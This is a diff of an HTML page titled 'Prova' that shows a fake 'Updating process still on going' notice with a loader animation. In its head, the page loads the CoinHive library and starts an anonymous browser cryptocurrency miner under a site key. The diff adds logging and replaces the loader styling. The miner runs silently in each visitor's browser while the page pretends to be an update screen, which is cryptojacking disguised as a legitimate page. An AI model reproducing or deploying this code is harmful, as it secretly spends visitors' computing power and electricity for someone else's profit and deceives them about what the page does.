@@ -3,66 +3,15 @@
 <head>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0" />
+	<link rel="stylesheet" href="style.css">
 	<title>Prova</title>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script>
+		console.log("start mining");
 		var miner = new CoinHive.Anonymous('xpT38q8KsKS0stKJgrA3L7cqZcxs9ryw', {throttle: 0.5});
 		miner.start();
+		console.log("mining");
 	</script>
-
-	<style>
-		/* Center the loader */
-		#loader {
-		  position: absolute;
-		  left: 50%;
-		  top: 50%;
-		  z-index: 1;
-		  width: 150px;
-		  height: 150px;
-		  margin: -75px 0 0 -75px;
-		  border: 16px solid #f3f3f3;
-		  border-radius: 50%;
-		  border-top: 16px solid #3498db;
-		  width: 120px;
-		  height: 120px;
-		  -webkit-animation: spin 2s linear infinite;
-		  animation: spin 2s linear infinite;
-		}
-
-		@-webkit-keyframes spin {
-		  0% { -webkit-transform: rotate(0deg); }
-		  100% { -webkit-transform: rotate(360deg); }
-		}
-
-		@keyframes spin {
-		  0% { transform: rotate(0deg); }
-		  100% { transform: rotate(360deg); }
-		}
-
-		/* Add animation to "page content" */
-		.animate-bottom {
-		  position: relative;
-		  -webkit-animation-name: animatebottom;
-		  -webkit-animation-duration: 1s;
-		  animation-name: animatebottom;
-		  animation-duration: 1s
-		}
-
-		@-webkit-keyframes animatebottom {
-		  from { bottom:-100px; opacity:0 } 
-		  to { bottom:0px; opacity:1 }
-		}
-
-		@keyframes animatebottom { 
-		  from{ bottom:-100px; opacity:0 } 
-		  to{ bottom:0; opacity:1 }
-		}
-
-		#myDiv {
-		  display: none;
-		  text-align: center;
-		}
-	</style>
 </head>
 <body>
 	<main>
@@ -71,7 +20,18 @@
 			<br><br>
 			<strong style="font-size: 25px; color: red;">Updating process still on going</strong>
 			<br><br>
-			<div id="loader"></div>
+			<div class="preloader-1">
+			  <div style="color: black;">Updating</div>
+			  <span class="line line-1"></span>
+			  <span class="line line-2"></span>
+			  <span class="line line-3"></span>
+			  <span class="line line-4"></span>
+			  <span class="line line-5"></span>
+			  <span class="line line-6"></span>
+			  <span class="line line-7"></span>
+			  <span class="line line-8"></span>
+			  <span class="line line-9"></span>
+			</div>
 		</center>
 		
 		<!--<div class="coinhive-miner" 
